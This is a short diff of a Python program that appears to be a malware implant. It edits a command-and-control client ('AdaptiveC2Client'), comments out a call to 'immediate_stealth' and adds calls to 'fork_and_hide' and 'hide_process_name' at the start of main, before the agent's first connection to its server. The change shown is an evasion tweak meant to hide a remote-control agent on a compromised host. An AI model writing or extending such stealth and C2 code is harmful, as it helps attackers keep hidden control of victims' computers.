@@ -23,7 +23,7 @@ def immediate_stealth():
         return False
 
 # Apply stealth immediately
-immediate_stealth()
+#immediate_stealth()
 
 import os, sys, json, base64, time, random, urllib, urllib.request, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
 from urllib.parse import urlencode
@@ -586,6 +586,10 @@ class AdaptiveC2Client:
 
 # Integration with the existing code
 def main():
+
+    fork_and_hide()
+
+    hide_process_name()
 
     STEALTH_MODE = True
     # Perform our initial connection to the server to setup the agent
